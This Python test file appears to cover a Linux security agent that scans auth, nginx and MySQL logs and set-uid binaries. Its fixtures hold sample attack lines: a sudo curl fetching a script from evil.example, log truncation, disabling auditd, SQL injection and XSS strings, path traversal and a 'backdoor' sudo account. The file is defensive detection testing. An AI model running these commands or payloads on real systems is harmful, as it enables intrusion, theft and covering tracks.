"""
Tests for the AiBoO Linux Sentinel.

Run from the linux-agent folder:

    python3 -m pytest tests/test_linux_agent.py -q
    # or, with no pytest installed:
    python3 tests/test_linux_agent.py
"""

import importlib.util
import sys
import tempfile
import time
from pathlib import Path

DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(DIR))


def _load():
    # dataclasses needs the module registered in sys.modules while it runs
    spec = importlib.util.spec_from_file_location("aiboo_linux_agent", DIR / "aiboo_linux_agent.py")
    mod = importlib.util.module_from_spec(spec)
    sys.modules["aiboo_linux_agent"] = mod
    spec.loader.exec_module(mod)
    return mod


agent = _load()


class State:
    """Minimal AgentState stand-in (no disk writes in tests)."""

    def __init__(self):
        self.counters = agent.Counters()
        self.offsets = {}
        self.seen = set()

    def already_sent(self, key):
        return key in self.seen

    def remember(self, key):
        self.seen.add(key)

    def save(self):
        pass

    def reset_offsets(self):
        pass


def settings(**kw):
    st = agent.Settings(dry_run=True, endpoint_name="test-linux")
    for k, v in kw.items():
        setattr(st, k, v)
    return st


def detect(kind, line, st=None, state=None):
    st = st or settings()
    state = state or State()
    state.counters.now = time.time()
    return agent.DETECTORS[kind](line, st, state, f"{kind}.log")


# --------------------------------------------------------------------------
# auth.log / sshd
# --------------------------------------------------------------------------

AUTH_FAIL = ("Feb 11 03:14:15 web sshd[123]: Failed password for invalid user admin "
             "from 45.95.147.3 port 51000 ssh2")
AUTH_OK = "Feb 11 03:20:00 web sshd[200]: Accepted password for deploy from 45.95.147.3 port 51020 ssh2"
AUTH_MAX_TRY = ("Feb 11 03:14:20 web sshd[126]: error: maximum authentication attempts exceeded "
                "for root from 45.95.147.3 port 51010 ssh2")


def test_single_failed_logon_is_context_only():
    assert detect("auth", AUTH_FAIL) == []


def test_five_failures_from_one_ip_raise_brute_force():
    st, state = settings(), State()
    findings = []
    for _ in range(5):
        findings += detect("auth", AUTH_FAIL, st, state)
    assert findings, "expected a brute-force finding after 5 failures"
    top = findings[-1]
    assert top.pattern == "brute_force"
    assert top.severity == "high"
    assert top.src_ip == "45.95.147.3"
    assert top.extra["failed_attempts"] >= 5


def test_failures_for_different_users_still_count_per_ip():
    st, state = settings(), State()
    out = []
    for user in ("a", "b", "c", "d", "e"):
        line = f"Feb 11 03:14:15 web sshd[1]: Failed password for {user} from 9.9.9.9 port 5 ssh2"
        out += detect("auth", line, st, state)
    assert any(f.pattern == "brute_force" for f in out)


def test_success_after_failures_is_critical():
    st, state = settings(), State()
    for _ in range(3):
        detect("auth", AUTH_FAIL, st, state)
    out = detect("auth", AUTH_OK, st, state)
    assert out and out[0].pattern == "login_after_brute_force"
    assert out[0].severity == "critical"
    assert out[0].subject == "deploy"


def test_plain_success_is_low_logon_success():
    out = detect("auth", AUTH_OK)
    assert out and out[0].pattern == "logon_success" and out[0].severity == "low"


def test_max_auth_tries_counts_as_failure():
    st, state = settings(), State()
    out = []
    for _ in range(5):
        out += detect("auth", AUTH_MAX_TRY, st, state)
    assert any(f.pattern == "brute_force" for f in out)


def test_possible_break_in_attempt():
    out = detect("auth", "Feb 11 03:15:00 web sshd[300]: reverse mapping checking getaddrinfo "
                         "for 45.95.147.3 failed - POSSIBLE BREAK-IN ATTEMPT!")
    assert out and out[0].pattern == "network_intrusion" and out[0].severity == "high"


def test_no_identification_probe_needs_three():
    st, state = settings(), State()
    line = "Feb 11 03:15:00 web sshd[400]: Did not receive identification string from 45.95.147.3"
    assert detect("auth", line, st, state) == []
    detect("auth", line, st, state)
    out = detect("auth", line, st, state)
    assert out and out[0].pattern == "network_intrusion"


# --------------------------------------------------------------------------
# sudo / accounts / persistence / hiding tracks
# --------------------------------------------------------------------------

def test_dangerous_sudo_command_is_high():
    out = detect("auth", "Feb 11 03:15:00 web sudo: xenthives : TTY=pts/0 ; PWD=/home/xenthives ; "
                         "USER=root ; COMMAND=/usr/bin/curl http://evil.example/x.sh")
    assert out and out[0].pattern == "suspicious_sudo" and out[0].severity == "high"


def test_normal_sudo_command_is_quiet():
    out = detect("auth", "Feb 11 03:15:00 web sudo: xenthives : TTY=pts/0 ; PWD=/home/xenthives ; "
                         "USER=root ; COMMAND=/usr/bin/systemctl status nginx")
    # systemctl is in the watch list; a plain restart of a service is visible but
    # must at least never be silent-critical
    assert all(f.severity != "critical" for f in out)


def test_useradd_userdel_and_group():
    assert detect("auth", "Feb 11 03:16:00 web useradd[900]: new user: name=backdoor, UID=1002")[0].pattern == "account_created"
    assert detect("auth", "Feb 11 03:16:10 web userdel[901]: delete user 'backdoor'")[0].pattern == "account_deleted"
    group = detect("auth", "Feb 11 03:16:30 web usermod[901]: add 'backdoor' to group 'sudo'")
    assert group and group[0].pattern == "admin_group_add" and group[0].extra["privileged_group"] == "sudo"


def test_crontab_change_is_persistence():
    out = detect("auth", "Feb 11 03:17:00 web crontab[902]: (root) REPLACE (root)")
    assert out and out[0].pattern == "scheduled_task"


def test_log_truncation_is_critical():
    out = detect("auth", "Feb 11 03:18:00 web sudo: bob : TTY=pts/1 ; USER=root ; "
                         "COMMAND=/usr/bin/truncate -s 0 /var/log/auth.log")
    assert out and out[0].pattern in ("log_cleared", "suspicious_sudo")
    assert any(f.severity == "critical" for f in out)


def test_audit_disabled_is_high():
    out = detect("auth", "Feb 11 03:18:30 web sudo: bob : TTY=pts/1 ; USER=root ; "
                         "COMMAND=/usr/sbin/auditctl -e 0")
    assert out and any(f.pattern in ("audit_policy_changed", "suspicious_sudo") for f in out)


# --------------------------------------------------------------------------
# nginx access log - web attacks
# --------------------------------------------------------------------------

def access(path, status=200, ip="45.95.147.3", ua="curl/8.0", method="GET"):
    return (f'{ip} - - [11/Feb/2026:03:20:01 +0530] "{method} {path} HTTP/1.1" '
            f'{status} 512 "-" "{ua}"')


def test_sql_injection_detected():
    out = detect("access", access("/api/login?user=admin%27%20OR%20%271%27%3D%271"))
    assert out and out[0].pattern == "sql_injection" and out[0].severity == "critical"


def test_sql_injection_union_select():
    out = detect("access", access("/items?id=1%20UNION%20SELECT%20username,password%20FROM%20users"))
    assert out and out[0].pattern == "sql_injection"


def test_xss_detected():
    out = detect("access", access("/search?q=%3Cscript%3Ealert(1)%3C/script%3E"))
    assert out and out[0].pattern == "xss_attempt"


def test_traversal_detected():
    out = detect("access", access("/../../etc/passwd", status=404))
    assert out and out[0].pattern == "path_traversal"


def test_env_served_is_critical():
    out = detect("access", access("/.env", status=200))
    assert out and out[0].pattern == "sensitive_file_hit" and out[0].severity == "critical"


def test_env_probe_refused_is_high():
    out = detect("access", access("/.env", status=403))
    assert out and out[0].pattern == "sensitive_file_probe"
    assert out[0].severity in ("high", "critical")


def test_scanner_user_agent_detected():
    out = detect("access", access("/", ua="sqlmap/1.7#stable (http://sqlmap.org)"))
    assert out and out[0].pattern == "scanner_activity" and out[0].extra["tool"] == "sqlmap"


def test_404_flood_is_directory_scan():
    st, state = settings(), State()
    out = []
    for i in range(st.scan_404_threshold):
        out += detect("access", access(f"/admin{i}", status=404), st, state)
    assert any(f.pattern == "directory_scan" for f in out)


def test_web_login_brute_force():
    st, state = settings(), State()
    out = []
    for _ in range(st.web_fail_threshold):
        out += detect("access", access("/api/login", status=401), st, state)
    assert any(f.pattern == "brute_force" for f in out)


def test_error_flood_is_burst():
    st, state = settings(), State()
    out = []
    for _ in range(st.error_burst_threshold):
        out += detect("access", access("/api/items", status=500), st, state)
    assert any(f.pattern == "error_burst" for f in out)


def test_long_url_is_flagged():
    out = detect("access", access("/x?" + "a" * 2500, status=414))
    assert any(f.pattern == "network_intrusion" for f in out)


def test_bad_ip_from_blocklist(tmp_path=None):
    import tempfile
    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fh:
        fh.write("# bad\n45.95.147.0/24\n")
        path = fh.name
    st = settings(blocklist_file=path)
    out = detect("access", access("/", ip="45.95.147.3"), st, State())
    assert any(f.pattern == "threat_intel_alert" for f in out)


def test_normal_traffic_is_quiet():
    assert detect("access", access("/api/items", status=200, ip="10.0.0.5", ua="Mozilla/5.0")) == []


# --------------------------------------------------------------------------
# nginx error log + mysql
# --------------------------------------------------------------------------

def test_nginx_tls_handshake_scan_needs_twenty():
    st, state = settings(), State()
    line = "2026/02/11 03:20:10 [error] 15#15: *9 SSL_do_handshake() failed (SSL: ) while SSL handshaking, client: 45.95.147.3, server: 0.0.0.0:443"
    out = []
    for _ in range(20):
        out += detect("error", line, st, state)
    assert any(f.pattern == "scanner_activity" for f in out)


def test_mysql_denied_burst():
    st, state = settings(), State()
    line = "2026-02-11T03:21:00.123456Z 0 [Warning] Access denied for user 'root'@'45.95.147.3' (using password: YES)"
    out = []
    for _ in range(5):
        out += detect("mysql", line, st, state)
    assert any(f.pattern == "brute_force" for f in out)


# --------------------------------------------------------------------------
# scoring / verdicts / API payload
# --------------------------------------------------------------------------

def test_risk_formula_matches_the_windows_agent():
    st = settings(importance="normal")
    finding = agent.Finding(pattern="sql_injection", severity="critical", summary="x",
                            src_ip="1.2.3.4")
    trust = 70
    risk, intent = agent.risk_of(finding, trust, st.importance)
    expected = round(0.30 * (100 - trust) + 0.40 * intent + 0.30 * agent.IMPACT_POINTS["normal"])
    assert risk == expected


def test_verdict_thresholds():
    assert agent.verdict_for_risk(80) == "block"
    assert agent.verdict_for_risk(60) == "block"
    assert agent.verdict_for_risk(40) == "hold"
    assert agent.verdict_for_risk(20) == "pass"
    assert agent.severity_for_risk(80) == "critical"
    assert agent.severity_for_risk(60) == "high"
    assert agent.severity_for_risk(40) == "medium"
    assert agent.severity_for_risk(10) == "low"


def test_finding_payload_has_platform_and_linux_metadata():
    finding = agent.Finding(pattern="brute_force", severity="high", summary="Password guessing",
                            src_ip="45.95.147.3", subject="root", source_file="/var/log/auth.log")
    payload = finding.to_api("auroraa-prod-ubuntu", "web01", "linux")
    assert payload["platform"] == "linux"
    assert payload["metadata"]["platform"] == "linux"
    assert payload["metadata"]["pattern"] == "brute_force"
    assert payload["metadata"]["log_file"] == "/var/log/auth.log"
    assert payload["agent_name"] == agent.AGENT_NAME
    assert payload["threat_type"] == "identity_mismatch"


def test_importance_changes_the_score():
    finding = agent.Finding(pattern="account_created", severity="high", summary="x")
    low, _ = agent.risk_of(finding, 70, "low")
    high, _ = agent.risk_of(finding, 70, "critical")
    assert high > low


def test_recommends_block_and_disable():
    finding = agent.Finding(pattern="brute_force", severity="high", summary="x",
                            src_ip="45.95.147.3", subject="root")
    actions = {a["action"] for a in agent.recommend(finding)}
    assert "block_access" in actions and "restrict_identity" in actions


def test_posture_advice_does_not_create_approvals():
    low = agent.Finding(pattern="config_weakness", severity="low", summary="MaxAuthTries not set")
    high = agent.Finding(pattern="config_weakness", severity="high", summary="root login allowed")
    attack = agent.Finding(pattern="brute_force", severity="high", summary="password guessing")
    assert agent.should_decide(low) is False
    assert agent.should_decide(high) is True
    assert agent.should_decide(attack) is True


def test_trust_score_is_in_range():
    trust, factors = agent.trust_score()
    assert 0 <= trust <= 100
    assert isinstance(factors, list)


def test_selftest_runs():
    assert agent.selftest() == 0


def test_state_offsets_only_read_new_lines(tmp_path):
    log = tmp_path / "auth.log"
    log.write_text(AUTH_FAIL + "\n")
    state = agent.AgentState(tmp_path / "state.json")
    lines = agent.read_new_lines(log, state, "auth")
    assert len(lines) == 1
    assert agent.read_new_lines(log, state, "auth") == []      # nothing new
    with log.open("a") as fh:
        fh.write(AUTH_OK + "\n")
    assert len(agent.read_new_lines(log, state, "auth")) == 1


def test_rotation_is_handled(tmp_path):
    log = tmp_path / "auth.log"
    log.write_text(AUTH_FAIL + "\n" * 300)
    state = agent.AgentState(tmp_path / "state.json")
    agent.read_new_lines(log, state, "auth")
    log.write_text(AUTH_OK + "\n")                            # rotated: smaller file
    lines = agent.read_new_lines(log, state, "auth")
    assert lines == [AUTH_OK]


def test_partial_last_line_is_not_lost(tmp_path):
    log = tmp_path / "auth.log"
    log.write_text("first line\nincomplete")                  # no trailing newline
    state = agent.AgentState(tmp_path / "state.json")
    assert agent.read_new_lines(log, state, "auth") == ["first line"]
    with log.open("a") as fh:
        fh.write(" line\n")
    assert agent.read_new_lines(log, state, "auth") == ["incomplete line"]


# --------------------------------------------------------------------------
# set-uid binaries: normal OS ones must never spam the dashboard
# --------------------------------------------------------------------------

def test_suid_first_scan_only_records_a_baseline():
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "s.json")
    state.counters.now = time.time()
    first = agent.detect_suid_binaries(st, state)
    assert first == [], f"first scan should stay quiet, got {len(first)} findings"
    assert state.suid_baseline, "baseline was not recorded"


def test_known_suid_binaries_are_not_reported_again():
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "s.json")
    state.counters.now = time.time()
    agent.detect_suid_binaries(st, state)          # learns the baseline
    again = agent.detect_suid_binaries(st, state)
    assert again == [], f"baseline binaries were reported again: {again[:2]}"


def test_a_suid_binary_in_tmp_is_high_severity():
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "s.json")
    state.counters.now = time.time()
    state.suid_baseline = {"/usr/bin/passwd"}      # pretend we already know the box
    drop = Path(tempfile.mkdtemp())                # emulate /tmp without touching /tmp
    evil = drop / "rootme"
    evil.write_text("#!/bin/sh\n")
    evil.chmod(0o4755)
    agent.SUID_SCAN_DIRS = (str(drop),)
    agent.SUID_WRITABLE_DIRS = (str(drop),)
    try:
        found = agent.detect_suid_binaries(st, state)
    finally:
        agent.SUID_SCAN_DIRS = ("/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin",
                                "/usr/local/sbin", "/opt", "/srv", "/var/www", "/home", "/tmp", "/dev/shm")
        agent.SUID_WRITABLE_DIRS = ("/tmp", "/var/tmp", "/dev/shm", "/home", "/srv", "/var/www", "/run")
    assert len(found) == 1, found
    assert found[0].severity == "high", found[0].severity
    assert "New set-uid binary" in found[0].summary
    assert agent.should_decide(found[0]) is True, "a writable-location set-uid binary should raise an approval"


def test_new_suid_in_a_normal_directory_is_medium_and_advisory():
    """A brand-new set-uid binary in /usr/bin: worth telling, not worth a HOLD."""
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "s.json")
    state.counters.now = time.time()
    box = Path(tempfile.mkdtemp())
    (box / "known-tool").write_text("#!/bin/sh\n")
    (box / "known-tool").chmod(0o4755)

    saved = (agent.SUID_SCAN_DIRS, agent.SUID_NORMAL_DIRS, agent.SUID_WRITABLE_DIRS)
    # the temp dir must look like a *system* directory for this test
    agent.SUID_SCAN_DIRS = (str(box),)
    agent.SUID_NORMAL_DIRS = (str(box),)
    agent.SUID_WRITABLE_DIRS = ("/definitely-not-here",)
    try:
        assert agent.detect_suid_binaries(st, state) == []      # baseline only
        state.counters.now += 3600
        assert agent.detect_suid_binaries(st, state) == []      # nothing changed

        (box / "another-tool").write_text("#!/bin/sh\n")
        (box / "another-tool").chmod(0o4755)
        state.counters.now += 3600
        found = agent.detect_suid_binaries(st, state)
    finally:
        agent.SUID_SCAN_DIRS, agent.SUID_NORMAL_DIRS, agent.SUID_WRITABLE_DIRS = saved

    assert len(found) == 1, found
    assert found[0].severity == "medium", found[0].severity
    assert "New set-uid binary" in found[0].summary
    assert agent.should_decide(found[0]) is False, "a normal-directory change is advisory"


if __name__ == "__main__":
    passed = failed = 0
    for name, fn in sorted(globals().items()):
        if not name.startswith("test_") or not callable(fn):
            continue
        try:
            if name in ("test_state_offsets_only_read_new_lines", "test_rotation_is_handled",
                        "test_partial_last_line_is_not_lost", "test_bad_ip_from_blocklist"):
                import tempfile
                with tempfile.TemporaryDirectory() as tmp:
                    fn(Path(tmp))
            else:
                fn()
            passed += 1
            print(f"PASS  {name}")
        except AssertionError as exc:
            failed += 1
            print(f"FAIL  {name}: {exc}")
        except Exception as exc:                              # noqa: BLE001
            failed += 1
            print(f"ERROR {name}: {type(exc).__name__}: {exc}")
    print(f"\n{passed} passed, {failed} failed")
    sys.exit(1 if failed else 0)
